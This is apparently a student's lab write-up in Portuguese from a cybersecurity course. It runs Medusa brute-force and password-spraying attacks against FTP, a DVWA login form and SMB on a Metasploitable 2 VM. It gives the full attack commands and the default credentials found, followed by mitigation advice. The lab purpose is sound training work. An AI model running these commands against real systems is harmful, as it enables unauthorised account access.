# Ataques de Força Bruta com Medusa em Ambiente Controlado

Projeto do curso Cibersegurança do Zero à Prática (Santander / DIO).

## Objetivo

Simular ataques de força bruta contra serviços vulneráveis em laboratório e propor medidas de mitigação.

## Ambiente

| Item | Detalhe |
| --- | --- |
| Atacante | Kali Linux 2026.3 (VirtualBox) |
| Alvo | Metasploitable 2 (VirtualBox) |
| Rede | [Bridge / Host-Only], IP do alvo: [192.168.56.102] |

## Ferramentas

- Medusa v2.3
- Nmap
- Ftp (validação manual)

## Wordlists

- `wordlists/users.txt`: 4(quatro) usuários testados
- `wordlists/pass.txt`: 6(seis) senhas testadas
- `wordlists/smb_users.txt`: 8(oito) usuários testados
- `wordlists/smb_pass.txt`: 8(oito) senhas testadas

## Cenário 1: Força bruta em FTP

**Comandos:** medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M ftp -t 6-0 resultados/medusa_ftp_acertos.txt | medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M ftp -t 6 -v 6 2>&1 | tee resultados/medusa_ftp_completo.txt
**Resultado:** [ACCOUNT FOUND: User: msfadmin / Password: msfadmin] / 
[ACCOUNT FOUND: User: user / Password: user]
**Validação:** login manual realizado varias vezes devido falsos positivos do medusa `ftp 192.168.56.102`. Ver `images/04-ftp-login.png`.

## Cenário 2: Força bruta em formulário web (DVWA)

**Comando:** medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \ -m PAGE: '/dvwa/login.php' \    -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6
**Resultado:** [ACCOUNT FOUND: User: admin / Password: password]
**Validação:** login manual no site `http://192.168.56.102/dvwa/login.php`. Ver `images/05-teste-login-dvwa.png & 06-acesso-dvwa.png`.

## Cenário 3: Password spraying em SMB

**Comando:** medusa -h 192.168.56.102 -U smb_users.txt -P smb_pass.txt -M smbnt -t 2 -T 50
**Resultado:** [ACCOUNT FOUND: User: msfadmin / Password: msfadmin] / 
[ACCOUNT FOUND: User: user / Password: user]
**Validação:** login manual com `smbclient -L //192.168.56.102 -U msfadmin`. Ver `images/07-acesso-spraying.png`.

## Por que funcionou

- Credenciais padrão e fracas (`msfadmin/msfadmin & admin/password`).
- Ausência de limite de tentativas (sem bloqueio após falhas).
- Serviços expostos na rede sem restrição.

## Recomendações de mitigação

1. Trocar senhas padrão e usar senhas longas e únicas.
2. Limitar tentativas de login (fail2ban ou bloqueio temporário).
3. Usar autenticação multifator em FTP, SSH e painéis web.
4. Desativar serviços não utilizados (FTP e Telnet em texto puro).
5. Usar SFTP/SSH no lugar de FTP e Telnet.
6. Restringir acesso de rede por firewall e segmentação.
7. Monitorar e alertar sobre volume anormal de falhas de login.

## Conclusão

Neste projeto pratiquei ataques de força bruta e password spraying contra o Metasploitable 2 usando o Medusa, e validei os resultados manualmente. O principal aprendizado foi que uma ferramenta automatizada pode gerar falsos positivos: no DVWA, o Medusa marcou como válidas combinações que não davam acesso, e só a conferência manual revelou o erro. Também percebi que senhas padrão e contas de serviço com credenciais fracas são o maior risco nesse tipo de ambiente. Como mudança no meu próprio ambiente, aplicaria bloqueio de contas após falhas repetidas, troca de senhas padrão e desativação de FTP e Telnet.